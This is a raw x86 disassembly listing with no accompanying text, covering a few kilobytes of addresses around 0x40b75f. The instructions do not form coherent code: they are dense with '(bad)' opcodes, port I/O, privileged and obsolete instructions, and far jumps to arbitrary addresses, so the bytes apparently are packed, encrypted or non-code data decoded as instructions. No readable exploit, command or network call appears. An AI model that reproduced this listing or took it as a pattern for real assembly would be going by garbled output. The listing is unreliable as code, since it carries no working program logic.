  40b75f:	stos   DWORD PTR es:[edi],eax
  40b760:	push   ebp
  40b761:	mov    edi,0x347639de
  40b766:	inc    ecx
  40b767:	mov    BYTE PTR [eax-0x9e4eebe],bl
  40b76d:	fsub   st(0),st
  40b76f:	aam    0xa9
  40b771:	lods   al,BYTE PTR ds:[esi]
  40b772:	ror    BYTE PTR [edi+0x63],cl
  40b775:	aas    
  40b776:	aad    0x41
  40b778:	cli    
  40b779:	push   0x7d775009
  40b77e:	adc    BYTE PTR ds:0xbc7e7c29,al
  40b784:	mov    bl,dh
  40b786:	dec    ecx
  40b787:	jl     0x40b7a3
  40b789:	div    BYTE PTR [edi+0x72]
  40b78c:	stos   DWORD PTR es:[edi],eax
  40b78d:	addr16 ja 0x40b79a
  40b790:	jmp    0xa78b9d78
  40b795:	test   eax,0x1050d5bc
  40b79a:	xchg   ebx,eax
  40b79b:	pop    eax
  40b79c:	retf   
  40b79d:	scas   al,BYTE PTR es:[edi]
  40b79e:	mov    WORD PTR [ebx+0x3f],?
  40b7a1:	sub    DWORD PTR [ecx+0x7],esp
  40b7a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7a5:	jnp    0x40b814
  40b7a7:	out    dx,eax
  40b7a8:	std    
  40b7a9:	xchg   esi,ebp
  40b7ab:	or     dl,BYTE PTR [esi-0x1b37f02d]
  40b7b1:	retf   0x737d
  40b7b4:	ror    BYTE PTR [esi+0x5934f344],1
  40b7ba:	mov    al,ds:0x2c11f74d
  40b7bf:	and    al,0xa1
  40b7c1:	dec    edi
  40b7c2:	sahf   
  40b7c3:	repnz or bl,dh
  40b7c6:	(bad)  ds:[esi]
  40b7c9:	push   ecx
  40b7ca:	add    al,0x39
  40b7cc:	(bad)  
  40b7cd:	(bad)  
  40b7ce:	sbb    ch,dl
  40b7d0:	add    ecx,DWORD PTR [ebx+0x3f83ea95]
  40b7d6:	pop    esp
  40b7d7:	add    DWORD PTR [edi],ebx
  40b7d9:	push   ecx
  40b7da:	jo     0x40b7e7
  40b7dc:	sub    ecx,eax
  40b7de:	popa   
  40b7df:	mov    dh,0x63
  40b7e1:	das    
  40b7e2:	pushf  
  40b7e3:	in     al,0xb2
  40b7e5:	xchg   edi,eax
  40b7e6:	js     0x40b860
  40b7e8:	imul   ecx,DWORD PTR [edi+edx*4],0xffffffec
  40b7ec:	xchg   esp,eax
  40b7ed:	jecxz  0x40b861
  40b7ef:	dec    edi
  40b7f0:	daa    
  40b7f1:	aam    0x32
  40b7f3:	mov    ch,0x81
  40b7f5:	pusha  
  40b7f6:	mov    edi,0x672fe23e
  40b7fb:	pop    eax
  40b7fc:	xor    al,0x76
  40b7fe:	mov    al,0x2c
  40b800:	stc    
  40b801:	(bad)  
  40b802:	jmp    0x2bdfc141
  40b807:	dec    edi
  40b808:	imul   edi,DWORD PTR [edx],0xffffffff
  40b80b:	jae    0x40b7f3
  40b80d:	rcl    BYTE PTR [edx+edi*1+0x6a9c8a33],1
  40b814:	clc    
  40b815:	das    
  40b816:	ret    
  40b817:	push   ss
  40b818:	sub    ch,BYTE PTR [ebx+0x4a]
  40b81b:	retf   0x6bc6
  40b81e:	or     dl,BYTE PTR [edx-0x19b55cbe]
  40b824:	mov    ah,BYTE PTR [edi-0x1e]
  40b827:	mov    esi,0x527acbdc
  40b82c:	push   ecx
  40b82d:	adc    DWORD PTR [edx],ecx
  40b82f:	and    cl,BYTE PTR [edx+0x17]
  40b832:	and    eax,0xe02f0617
  40b837:	and    eax,0x1b6cebbb
  40b83c:	pop    ebp
  40b83d:	jo     0x40b7eb
  40b83f:	xor    DWORD PTR [ebx],ecx
  40b841:	mov    bl,0xac
  40b843:	jge    0x40b848
  40b845:	dec    esp
  40b846:	mov    esp,ebp
  40b848:	cmp    al,0x54
  40b84a:	stos   DWORD PTR es:[edi],eax
  40b84b:	popa   
  40b84c:	lds    edx,FWORD PTR [ebp-0xf970014]
  40b852:	cmp    al,BYTE PTR [edx]
  40b854:	add    esi,DWORD PTR [esi+edx*4-0x33]
  40b858:	iret   
  40b859:	xlat   BYTE PTR ds:[ebx]
  40b85a:	and    cl,BYTE PTR [ebp+0x19d46a31]
  40b860:	dec    ebp
  40b861:	icebp  
  40b862:	in     al,0xd3
  40b864:	hlt    
  40b865:	xchg   ebx,eax
  40b866:	inc    ebp
  40b867:	sahf   
  40b868:	lods   al,BYTE PTR ds:[esi]
  40b869:	js     0x40b835
  40b86b:	aam    0x4f
  40b86d:	or     al,0x67
  40b86f:	sub    al,0x4a
  40b871:	int    0xc5
  40b873:	nop
  40b874:	retf   
  40b875:	pop    ecx
  40b876:	jnp    0x40b81c
  40b878:	test   al,0x9a
  40b87a:	ins    BYTE PTR es:[edi],dx
  40b87b:	xor    DWORD PTR [eax],eax
  40b87d:	push   eax
  40b87e:	adc    bl,dl
  40b880:	cld    
  40b881:	xchg   ecx,eax
  40b882:	mov    ecx,0x6dd98508
  40b887:	and    cl,BYTE PTR [ebx]
  40b889:	loope  0x40b844
  40b88b:	ret    0x6549
  40b88e:	jge    0x40b860
  40b890:	nop
  40b891:	fild   QWORD PTR [eax]
  40b893:	sbb    eax,0x5737ebf3
  40b898:	jle    0x40b8e3
  40b89a:	push   cs
  40b89b:	mov    DWORD PTR [edx],ebp
  40b89d:	pusha  
  40b89e:	out    dx,al
  40b89f:	in     al,dx
  40b8a0:	sub    DWORD PTR [ecx],0x17
  40b8a3:	(bad)  
  40b8a4:	cmp    bl,BYTE PTR [ecx-0x460714d7]
  40b8aa:	(bad)  
  40b8ab:	and    edi,DWORD PTR [ebp-0xedecf41]
  40b8b1:	aam    0xab
  40b8b3:	xchg   ecx,eax
  40b8b4:	test   al,0xe0
  40b8b6:	push   esi
  40b8b7:	dec    ecx
  40b8b8:	nop
  40b8b9:	adc    al,ah
  40b8bb:	mov    WORD PTR [eax],gs
  40b8bd:	xchg   edx,eax
  40b8be:	outs   dx,BYTE PTR ds:[esi]
  40b8bf:	and    eax,0x637bf2be
  40b8c4:	xor    DWORD PTR [ecx+edx*4],0x8841ea0a
  40b8cb:	cmp    ebp,DWORD PTR [edx-0x10]
  40b8ce:	scas   eax,DWORD PTR es:[edi]
  40b8cf:	push   es
  40b8d0:	std    
  40b8d1:	aaa    
  40b8d2:	jno    0x40b865
  40b8d4:	add    BYTE PTR [edx+0x10],al
  40b8d7:	cmc    
  40b8d8:	dec    ebp
  40b8d9:	ror    DWORD PTR [ecx-0x707c729a],cl
  40b8df:	loopne 0x40b954
  40b8e1:	enter  0xd008,0xab
  40b8e5:	jo     0x40b8e2
  40b8e7:	in     al,0xc7
  40b8e9:	ins    BYTE PTR es:[edi],dx
  40b8ea:	mov    dh,0xbc
  40b8ec:	add    esi,ebx
  40b8ee:	and    bh,BYTE PTR [edi+0x255d6b49]
  40b8f4:	retf   
  40b8f5:	jbe    0x40b8fb
  40b8f7:	(bad)  
  40b8f8:	xchg   esp,eax
  40b8f9:	ins    BYTE PTR es:[edi],dx
  40b8fa:	pop    edi
  40b8fb:	cdq    
  40b8fc:	clc    
  40b8fd:	sahf   
  40b8fe:	add    esp,esp
  40b900:	pusha  
  40b901:	xchg   esi,eax
  40b902:	and    eax,0x89eacc09
  40b907:	cmp    al,0x8e
  40b909:	jns    0x40b8be
  40b90b:	test   al,0x28
  40b90d:	outs   dx,DWORD PTR ds:[esi]
  40b90e:	icebp  
  40b90f:	sub    BYTE PTR [eax],dh
  40b911:	mov    eax,0x56204915
  40b916:	pop    ss
  40b917:	adc    al,0x88
  40b91a:	pusha  
  40b91b:	xor    DWORD PTR ss:[eax],esi
  40b91e:	xor    edx,edi
  40b920:	mov    eax,0xaad8d17a
  40b925:	push   ebp
  40b926:	inc    eax
  40b927:	fsub   st,st(3)
  40b929:	clc    
  40b92a:	jne    0x40b8be
  40b92c:	rol    esp,cl
  40b92e:	or     DWORD PTR [ebx],ebx
  40b930:	iret   
  40b931:	add    eax,0x42e0f1af
  40b936:	push   0xc9fd766f
  40b93b:	sbb    ch,dh
  40b93d:	mov    ds:0xcc76098c,al
  40b942:	dec    esp
  40b943:	cli    
  40b944:	add    BYTE PTR [ebx-0x69a1a986],dh
  40b94a:	jno    0x40b9a9
  40b94c:	pop    ebx
  40b94d:	inc    edx
  40b94e:	and    bh,bl
  40b950:	pop    ebp
  40b951:	aaa    
  40b952:	push   0xe47a8173
  40b957:	mov    ch,0x1f
  40b959:	or     bl,ah
  40b95b:	hlt    
  40b95c:	sar    DWORD PTR [edi+0xcd9c24e],0xfd
  40b963:	out    0x8c,al
  40b965:	aam    0x85
  40b967:	sub    dl,al
  40b969:	aam    0xac
  40b96b:	dec    ecx
  40b96c:	clc    
  40b96d:	jecxz  0x40b996
  40b96f:	or     DWORD PTR [ebx+0x1c],ecx
  40b972:	call   0x2825:0xe620116d
  40b979:	test   DWORD PTR [edx+0x78e62b76],0x65f532cd
  40b983:	or     esi,DWORD PTR [eax+0x3c]
  40b986:	lock (bad) 
  40b988:	dec    edx
  40b989:	and    DWORD PTR es:[ecx+ebx*4-0x5959cc55],esi
  40b991:	xchg   BYTE PTR [edx],dl
  40b993:	sub    eax,0xe156e9ca
  40b998:	out    dx,eax
  40b999:	jl     0x40b9e8
  40b99b:	lock add eax,0x74511866
  40b9a1:	xchg   esi,eax
  40b9a2:	leave  
  40b9a3:	mov    eax,ds:0x1abf44e1
  40b9a8:	mov    bh,0x6
  40b9aa:	bound  edi,QWORD PTR [eax+ebx*8+0x6]
  40b9ae:	mov    esi,0xc18c3550
  40b9b3:	push   cs
  40b9b4:	mov    ecx,0x6d95f29c
  40b9b9:	les    eax,FWORD PTR [edi-0x3d11eef8]
  40b9bf:	call   0x5b0d291b
  40b9c4:	or     al,BYTE PTR [edi-0x43]
  40b9c7:	fisub  DWORD PTR [esi+esi*2-0x4c]
  40b9cb:	ror    BYTE PTR [edi],1
  40b9cd:	mov    es,WORD PTR [esi+0x4d]
  40b9d0:	jp     0x40b9f7
  40b9d2:	xchg   esp,eax
  40b9d3:	enter  0xf26,0x9a
  40b9d7:	aaa    
  40b9d8:	bnd js 0x40b9ec
  40b9db:	xor    dh,BYTE PTR [eax-0x5c23e7d5]
  40b9e1:	push   0x40
  40b9e3:	fild   DWORD PTR [edx+eax*1]
  40b9e6:	retf   0x743f
  40b9e9:	cs cs aad 0x53
  40b9ed:	imul   esi,DWORD PTR [esi-0x36fa34d9],0xed81add7
  40b9f7:	(bad)  
  40b9f9:	sahf   
  40b9fa:	out    dx,eax
  40b9fb:	les    edx,FWORD PTR [edi-0xba26dcd]
  40ba01:	inc    eax
  40ba02:	lods   eax,DWORD PTR ds:[esi]
  40ba03:	popa   
  40ba04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba05:	pop    esi
  40ba06:	mov    esi,0x9bec714d
  40ba0b:	mov    ebx,DWORD PTR [edi+0x3509dfe4]
  40ba11:	xor    DWORD PTR [esi],ecx
  40ba13:	ror    BYTE PTR ss:[ebx-0x3bdf3bbb],0x89
  40ba1b:	xchg   esi,eax
  40ba1c:	adc    cl,BYTE PTR [edi]
  40ba1e:	scas   eax,DWORD PTR es:[edi]
  40ba1f:	imul   ecx,DWORD PTR [edx-0x1f],0x42d7f84
  40ba26:	inc    eax
  40ba27:	mov    al,ds:0x28773a0c
  40ba2c:	call   0xba424d24
  40ba31:	scas   eax,DWORD PTR es:[edi]
  40ba32:	leave  
  40ba33:	mov    DWORD PTR [eax+eiz*1-0x59],ebp
  40ba37:	enter  0xecd3,0x6b
  40ba3b:	data16 jbe 0x40baa7
  40ba3e:	jo     0x40ba66
  40ba40:	jmp    0xafe3:0x4a8257ab
  40ba47:	push   es
  40ba48:	imul   ebp,DWORD PTR [eax],0x4255d541
  40ba4e:	lods   al,BYTE PTR cs:[si]
  40ba51:	fcmove st,st(6)
  40ba53:	outs   dx,DWORD PTR ds:[esi]
  40ba54:	mov    dh,0x22
  40ba56:	popf   
  40ba57:	cwde   
  40ba58:	mov    dl,0xae
  40ba5a:	ret    
  40ba5b:	mov    edi,0x96db4e6
  40ba60:	leave  
  40ba61:	(bad)  
  40ba62:	fisubr WORD PTR [eax-0x6840f2a0]
  40ba69:	rcr    DWORD PTR [eax],cl
  40ba6b:	jbe    0x40ba8e
  40ba6d:	mov    ebp,0xd93a0a3f
  40ba72:	fsubr  st(7),st
  40ba74:	imul   ebp,DWORD PTR [ecx+eiz*8],0xffffffca
  40ba78:	dec    ebp
  40ba79:	mov    edx,0x69dcdc0a
  40ba7e:	jns    0x40ba0f
  40ba80:	retf   
  40ba81:	nop
  40ba82:	sbb    DWORD PTR [ecx],eax
  40ba84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba85:	dec    eax
  40ba86:	repnz sti 
  40ba88:	pop    esi
  40ba89:	xchg   edx,eax
  40ba8a:	pop    edx
  40ba8b:	pop    es
  40ba8c:	retf   
  40ba8d:	lahf   
  40ba8e:	or     bl,ah
  40ba90:	fs repz dec edx
  40ba93:	pushf  
  40ba94:	cmp    bl,BYTE PTR [ebx+0x44e58ec9]
  40ba9a:	pop    esp
  40ba9b:	out    dx,al
  40ba9c:	icebp  
  40ba9d:	ret    0x1f54
  40baa0:	xchg   ecx,eax
  40baa1:	test   BYTE PTR [edx],dh
  40baa3:	loop   0x40ba40
  40baa5:	ret    0x7350
  40baa8:	in     eax,dx
  40baa9:	lods   al,BYTE PTR ds:[esi]
  40baaa:	ins    BYTE PTR es:[edi],dx
  40baab:	shl    DWORD PTR [esi+0x20],0xa6
  40baaf:	jb     0x40ba6b
  40bab1:	daa    
  40bab2:	sbb    DWORD PTR [eax-0x56b48594],eax
  40bab8:	into   
  40bab9:	hlt    
  40baba:	inc    edi
  40babb:	shl    DWORD PTR [ecx-0x4c],0xb
  40babf:	adc    al,0x73
  40bac1:	add    BYTE PTR [esi],0x6a
  40bac4:	mov    ah,0x2d
  40bac6:	push   edi
  40bac7:	in     al,dx
  40bac8:	xchg   edx,eax
  40bac9:	pop    ebp
  40baca:	in     al,dx
  40bacb:	les    ebx,FWORD PTR [esi-0x35]
  40bace:	fisub  DWORD PTR [ebp-0x1dcad922]
  40bad4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bad5:	fsubr  QWORD PTR [ecx]
  40bad7:	mov    eax,0x35f1bb20
  40badc:	loop   0x40ba67
  40bade:	in     al,dx
  40badf:	shl    DWORD PTR [edi+0x9],1
  40bae2:	ss lock inc edx
  40bae5:	or     eax,0xa5fd4071
  40baea:	lods   eax,DWORD PTR ds:[esi]
  40baeb:	sbb    eax,0x674986f1
  40baf0:	shl    dl,1
  40baf2:	call   0x1427:0x684ac418
  40baf9:	adc    eax,0x1ddbe18a
  40bafe:	ins    BYTE PTR es:[edi],dx
  40baff:	mov    ah,0x39
  40bb01:	popf   
  40bb02:	pop    esi
  40bb03:	scas   al,BYTE PTR es:[edi]
  40bb04:	jmp    0xf424d705
  40bb09:	sbb    al,0x3f
  40bb0b:	rcr    DWORD PTR [edi+0x54e7dd91],1
  40bb11:	call   0x204388b3
  40bb16:	lods   eax,DWORD PTR ds:[esi]
  40bb17:	mov    ds:0x8337cbe7,al
  40bb1c:	stos   DWORD PTR es:[edi],eax
  40bb1d:	outs   dx,DWORD PTR ds:[esi]
  40bb1e:	push   esp
  40bb1f:	pushf  
  40bb20:	or     BYTE PTR ds:[ebp-0x3c],0x76
  40bb25:	xchg   ebx,eax
  40bb26:	inc    esi
  40bb27:	retf   0xfcbd
  40bb2a:	push   0x4c
  40bb2c:	adc    cl,BYTE PTR [eax]
  40bb2e:	cmp    eax,0x34cf872e
  40bb33:	xor    DWORD PTR [esi+0xd],0x364c1874
  40bb3a:	fs test al,0xb3
  40bb3d:	xor    eax,0x1e31402d
  40bb42:	idiv   BYTE PTR [ebx-0x54733017]
  40bb48:	cli    
  40bb49:	and    DWORD PTR [edx-0x194c08db],ebp
  40bb4f:	sbb    eax,0x786a2321
  40bb54:	repnz clc 
  40bb56:	jae    0x40bae6
  40bb58:	ins    BYTE PTR es:[edi],dx
  40bb59:	dec    DWORD PTR [edi+0x77]
  40bb5c:	xchg   esi,eax
  40bb5d:	xchg   esp,eax
  40bb5e:	cdq    
  40bb5f:	hlt    
  40bb60:	in     eax,0xd5
  40bb62:	jns    0x40bbbf
  40bb64:	or     esi,DWORD PTR [edx+esi*8]
  40bb67:	ds push 0x65
  40bb6a:	pop    ds
  40bb6b:	cdq    
  40bb6c:	xchg   ecx,eax
  40bb6d:	add    al,0xdd
  40bb6f:	dec    esp
  40bb70:	stos   BYTE PTR es:[edi],al
  40bb71:	mov    cl,BYTE PTR [ebx-0x2a]
  40bb74:	fild   DWORD PTR [edi]
  40bb76:	xor    dl,ch
  40bb78:	xchg   ax,ax
  40bb7a:	inc    esi
  40bb7b:	sub    eax,0x36df7695
  40bb80:	mov    al,ds:0xcc51dca7
  40bb85:	scas   al,BYTE PTR es:[edi]
  40bb86:	and    edi,edx
  40bb88:	jae    0x40bb80
  40bb8a:	sbb    DWORD PTR [esi+0x354dd9c4],esp
  40bb90:	das    
  40bb91:	mov    dh,0x41
  40bb93:	xor    bl,ah
  40bb95:	fild   QWORD PTR fs:[esi]
  40bb98:	mov    eax,0x9fec5b26
  40bb9d:	cmp    BYTE PTR [edi+0x41d05db0],bh
  40bba3:	(bad)  
  40bba5:	inc    ebp
  40bba6:	in     al,0x2
  40bba8:	rcl    ecx,cl
  40bbaa:	inc    esp
  40bbab:	mov    bl,0x58
  40bbad:	and    al,0x1c
  40bbaf:	push   ecx
  40bbb0:	mov    al,0xdf
  40bbb2:	jae    0x40bb46
  40bbb4:	lods   eax,DWORD PTR ds:[esi]
  40bbb5:	sbb    al,0x37
  40bbb7:	daa    
  40bbb8:	imul   ebx,DWORD PTR [esi+0x7c],0xe
  40bbbc:	lods   al,BYTE PTR ds:[esi]
  40bbbd:	fstp   DWORD PTR [esi-0x25d84133]
  40bbc3:	mov    ebp,0x1b617a56
  40bbc8:	and    DWORD PTR gs:[eax],eax
  40bbcb:	cli    
  40bbcc:	push   esp
  40bbcd:	xlat   BYTE PTR ds:[ebx]
  40bbce:	stc    
  40bbcf:	jmp    0xed604b9e
  40bbd4:	(bad)  
  40bbd6:	cmp    eax,0xf9ab7342
  40bbdb:	push   edi
  40bbdc:	ficom  WORD PTR ds:0xe76cb359
  40bbe2:	jl     0x40bc26
  40bbe4:	add    eax,DWORD PTR [edx-0x21805870]
  40bbea:	push   cs
  40bbeb:	push   esi
  40bbec:	xchg   ebp,eax
  40bbed:	push   DWORD PTR [esi+0x149c08d]
  40bbf3:	mov    bh,BYTE PTR [edi-0x76]
  40bbf6:	fisub  DWORD PTR [ebp+0x71d66079]
  40bbfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbfd:	push   ss
  40bbfe:	mov    al,ds:0x4aa9b8a6
  40bc03:	and    esp,DWORD PTR [ecx+0x4a4c25fe]
  40bc09:	mov    DWORD PTR [ecx+0x739a4e1b],edx
  40bc0f:	fldenv [edx-0x5f5a1099]
  40bc15:	cmp    BYTE PTR [edi-0x3b3db627],cl
  40bc1b:	cmp    BYTE PTR [edi+eax*1],dh
  40bc1e:	push   esi
  40bc1f:	dec    ebx
  40bc20:	push   ss
  40bc21:	cmp    al,0xec
  40bc23:	fild   QWORD PTR ds:0x2d78390b
  40bc29:	call   0xcf2f:0x5b99d14c
  40bc30:	xor    esp,DWORD PTR [edi-0x1301ef08]
  40bc36:	push   0x7a
  40bc38:	imul   esp,DWORD PTR [ecx+edx*1],0x5013a7bd
  40bc3f:	scas   al,BYTE PTR es:[edi]
  40bc40:	jg     0x40bc1f
  40bc42:	daa    
  40bc43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc44:	aam    0xae
  40bc46:	div    DWORD PTR [ebx-0x6a5ddb9c]
  40bc4c:	push   eax
  40bc4d:	jmp    0x40bca4
  40bc4f:	add    ebp,DWORD PTR [ecx+0x48]
  40bc52:	loop   0x40bca8
  40bc54:	sub    eax,ebx
  40bc56:	scas   al,BYTE PTR es:[edi]
  40bc57:	imul   eax,DWORD PTR [ecx],0x6491cc5b
  40bc5d:	mov    dh,0x4f
  40bc5f:	mov    al,BYTE PTR [esp+ebx*4]
  40bc62:	outs   dx,BYTE PTR ds:[esi]
  40bc63:	push   edi
  40bc64:	mov    dh,al
  40bc66:	pop    esi
  40bc67:	sbb    eax,0xe1f1ef4b
  40bc6c:	iret   
  40bc6d:	in     al,dx
  40bc6e:	les    esi,FWORD PTR [edi-0x39db4307]
  40bc74:	mov    eax,0xff867256
  40bc79:	xchg   ecx,eax
  40bc7a:	retf   0x741a
  40bc7d:	push   esp
  40bc7e:	or     eax,0x7126ab6f
  40bc83:	jnp    0x40bca4
  40bc85:	mov    esi,0x5d5370f3
  40bc8a:	aad    0xf1
  40bc8c:	mov    WORD PTR [edi+0x63],gs
  40bc8f:	repz fs call 0xfaa2:0x28e7d253
  40bc98:	xchg   ecx,eax
  40bc99:	and    BYTE PTR [eax+0x51],ah
  40bc9c:	inc    ebx
  40bc9d:	test   al,0xa8
  40bc9f:	jecxz  0x40bccb
  40bca1:	imul   edx,ebp,0xffffffe9
  40bca4:	mov    ch,0x91
  40bca6:	mov    esi,0x293ab324
  40bcab:	sbb    BYTE PTR [eax],dh
  40bcad:	mov    ecx,0xab096ca6
  40bcb2:	cmp    BYTE PTR [eax-0x5a356c46],0x23
  40bcb9:	ja     0x40bce2
  40bcbb:	lods   al,BYTE PTR ds:[esi]
  40bcbc:	inc    bp
  40bcbe:	pop    ebx
  40bcbf:	jle    0x40bd00
  40bcc1:	les    esp,FWORD PTR [edx+ebp*8]
  40bcc4:	sub    esp,0xc34696af
  40bcca:	aas    
  40bccb:	xor    eax,ebx
  40bccd:	jo     0x40bc9a
  40bccf:	mov    al,0x67
  40bcd1:	cs out 0x66,eax
  40bcd4:	bound  ebx,QWORD PTR [ecx]
  40bcd6:	loope  0x40bd42
  40bcd8:	repz jns 0x40bc7e
  40bcdb:	inc    ebx
  40bcdc:	dec    edx
  40bcdd:	cmp    DWORD PTR [ecx+0x1e],ebx
  40bce0:	shr    BYTE PTR [ecx-0x433f588a],1
  40bce6:	mov    BYTE PTR [eax],bh
  40bce8:	push   es
  40bce9:	cmp    al,0xce
  40bceb:	bound  ebp,QWORD PTR [edi+0x6a]
  40bcee:	call   0xd4b3:0xecf96a2b
  40bcf5:	xor    ecx,DWORD PTR [edx-0x27]
  40bcf8:	adc    DWORD PTR [eax+0x70],eax
  40bcfb:	xchg   ebx,eax
  40bcfc:	mov    BYTE PTR [ebx-0x1a],cl
  40bcff:	je     0x40bcb5
  40bd01:	out    0x99,eax
  40bd03:	lea    esp,[eax+eax*8+0x2ee5cf50]
  40bd0a:	mov    edi,0x9943d0f0
  40bd0f:	test   ch,dl
  40bd11:	jg     0x40bcb9
  40bd13:	push   eax
  40bd14:	or     ah,BYTE PTR [ecx+0x63]
  40bd17:	dec    eax
  40bd18:	aaa    
  40bd19:	xchg   esp,eax
  40bd1a:	xchg   esp,eax
  40bd1b:	call   0xf39c:0x6c7eb5d3
  40bd22:	inc    ebx
  40bd23:	or     eax,0x60012469
  40bd28:	mov    cl,0x36
  40bd2a:	int    0x62
  40bd2c:	dec    ebp
  40bd2d:	test   DWORD PTR [esp+ebx*4-0xe],esp
  40bd31:	mov    cl,0xad
  40bd33:	mov    ebp,0xdd63c78
  40bd38:	push   es
  40bd39:	arpl   WORD PTR [edi-0x5f],di
  40bd3c:	shl    BYTE PTR [ebp-0x7d],1
  40bd3f:	int    0x57
  40bd41:	outs   dx,BYTE PTR ds:[esi]
  40bd42:	es (bad) 
  40bd44:	pop    esp
  40bd45:	xchg   BYTE PTR ds:0x357cdea0,dl
  40bd4b:	jp     0x40bdbf
  40bd4d:	cli    
  40bd4e:	pop    edi
  40bd4f:	mov    eax,ds:0x9af0f455
  40bd54:	dec    ecx
  40bd55:	xor    al,0xb
  40bd57:	loop   0x40bd6a
  40bd59:	cdq    
  40bd5a:	and    BYTE PTR [ebx+0x57],dh
  40bd5d:	jnp    0x40bd80
  40bd5f:	enter  0x21ee,0x77
  40bd63:	mov    eax,0xdb75b284
  40bd68:	mov    eax,0x9bee18ad
  40bd6d:	inc    edi
  40bd6e:	mov    edx,ebx
  40bd70:	fimul  DWORD PTR [esi+0x3f]
  40bd73:	(bad)  
  40bd75:	sbb    bh,BYTE PTR [eax+0x1]
  40bd78:	adc    al,0xcb
  40bd7a:	(bad)  
  40bd7c:	pop    eax
  40bd7d:	fs ret 0x3344
  40bd81:	xchg   esi,eax
  40bd82:	xor    al,BYTE PTR [esi+0x68fcbc9a]
  40bd88:	pop    ebp
  40bd89:	retf   
  40bd8a:	out    0xc7,al
  40bd8c:	mov    DWORD PTR [edi-0x25],esi
  40bd8f:	mov    esi,0xaf2c2d2d
  40bd94:	jmp    0xd079eaa5
  40bd99:	test   al,0x71
  40bd9b:	stc    
  40bd9c:	and    esp,DWORD PTR [esi+0x7f966687]
  40bda2:	and    bh,al
  40bda4:	out    0x48,eax
  40bda6:	lods   al,BYTE PTR ds:[esi]
  40bda7:	mov    cl,0xb7
  40bda9:	imul   edx,DWORD PTR [ebx-0x76],0x67
  40bdad:	int3   
  40bdae:	jns    0x40bdee
  40bdb0:	mov    ebp,0x5235bbf2
  40bdb5:	sub    DWORD PTR [ebx-0x34],esi
  40bdb8:	icebp  
  40bdb9:	lods   al,BYTE PTR ds:[esi]
  40bdba:	or     esi,DWORD PTR [ebp+0x54]
  40bdbd:	nop
  40bdbe:	mov    ebx,?
  40bdc0:	cmc    
  40bdc1:	or     cl,dl
  40bdc3:	test   BYTE PTR [edi],0xa9
  40bdc6:	or     ah,BYTE PTR [ebx]
  40bdc8:	jp     0x40bd88
  40bdca:	inc    edi
  40bdcb:	xor    dh,BYTE PTR [ecx+esi*8-0x7e3755cd]
  40bdd2:	call   0x1314da8a
  40bdd7:	nop
  40bdd8:	idiv   DWORD PTR [esp+esi*1+0x3b]
  40bddc:	fcomp  QWORD PTR [ebp-0x2d]
  40bddf:	sar    DWORD PTR [edx+ebx*4-0x75d2d1b3],cl
  40bde6:	dec    eax
  40bde7:	ins    BYTE PTR es:[edi],dx
  40bde8:	(bad)  
  40bdea:	fstp   QWORD PTR [edx]
  40bdec:	xor    DWORD PTR [ecx],edx
  40bdee:	mov    al,ds:0x734b56e7
  40bdf3:	sahf   
  40bdf4:	lods   eax,DWORD PTR ds:[esi]
  40bdf5:	repz lds edi,FWORD PTR [ebx+0x2b7c463b]
  40bdfc:	clc    
  40bdfd:	mov    cl,0x5d
  40bdff:	xchg   BYTE PTR es:[edx-0x329254ca],ch
  40be06:	and    eax,0x3823db5f
  40be0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be0c:	and    DWORD PTR [edi],ebx
  40be0e:	test   DWORD PTR ds:0x5fb5fcee,0xfa067676
  40be18:	in     eax,dx
  40be19:	jge    0x40bdb3
  40be1b:	or     eax,0xc534180b
  40be20:	and    esi,DWORD PTR [edi+ebp*8+0x41]
  40be24:	jmp    0x6799:0xe98fff3a
  40be2b:	call   0xce05d073
  40be30:	jmp    0xa09537aa
  40be35:	inc    ebx
  40be36:	push   ebx
  40be37:	cmp    eax,0x1205ba09
  40be3c:	fcomp  DWORD PTR [eax-0x5b]
  40be3f:	sub    dl,BYTE PTR [edi]
  40be41:	and    al,BYTE PTR [ebx-0x13]
  40be44:	sbb    al,0x48
  40be46:	mov    dl,0x2
  40be48:	inc    esi
  40be49:	mov    ah,0x1d
  40be4b:	add    DWORD PTR [edi],ebx
  40be4d:	jmp    0xe72420ad
  40be52:	mov    eax,0x9950f603
  40be57:	inc    ebp
  40be58:	clc    
  40be59:	sahf   
  40be5a:	xchg   DWORD PTR [edi+0x32],eax
  40be5d:	fxtract 
  40be5f:	inc    edx
  40be60:	scas   eax,DWORD PTR es:[edi]
  40be61:	push   esi
  40be62:	cdq    
  40be63:	inc    ebx
  40be64:	bound  esi,QWORD PTR ds:0xc76165da
  40be6a:	aaa    
  40be6b:	outs   dx,DWORD PTR ds:[esi]
  40be6c:	xor    dl,BYTE PTR [eax]
  40be6e:	je     0x40bedc
  40be70:	stos   BYTE PTR es:[edi],al
  40be71:	xchg   esp,eax
  40be72:	xor    al,0x5c
  40be74:	adc    al,0xe3
  40be76:	lahf   
  40be77:	daa    
  40be78:	xor    ecx,DWORD PTR [eax]
  40be7a:	adc    BYTE PTR ds:0xcc8a5399,ch
  40be80:	jle    0x40be6a
  40be82:	adc    bh,bh
  40be84:	pop    ss
  40be85:	inc    eax
  40be86:	xchg   DWORD PTR [esi],esp
  40be88:	mov    ebx,DWORD PTR [edi+ebp*2-0x26]
  40be8c:	pop    gs
  40be8e:	in     eax,0xa4
  40be90:	ins    DWORD PTR es:[edi],dx
  40be91:	fdiv   DWORD PTR ds:0x9c687341
  40be97:	mov    bl,BYTE PTR [esi-0x37]
  40be9a:	xor    eax,0xfce264ba
  40be9f:	jns    0x40be22
  40bea1:	hlt    
  40bea2:	adc    DWORD PTR [ebx-0x11deda67],ebp
  40bea8:	xchg   ecx,eax
  40bea9:	jecxz  0x40bf04
  40beab:	pop    ds
  40beac:	call   0xfb7da071
  40beb1:	cmp    eax,0xc2eb5b20
  40beb6:	aas    
  40beb7:	aaa    
  40beb8:	push   ebx
  40beb9:	(bad)  
  40beba:	sahf   
  40bebb:	inc    ecx
  40bebc:	fadd   QWORD PTR [edx+0x5]
  40bebf:	loopne 0x40bed5
  40bec1:	jo     0x40be8b
  40bec3:	push   edi
  40bec4:	sbb    eax,0x93643f9f
  40bec9:	sbb    al,0x13
  40becb:	mov    dh,0x10
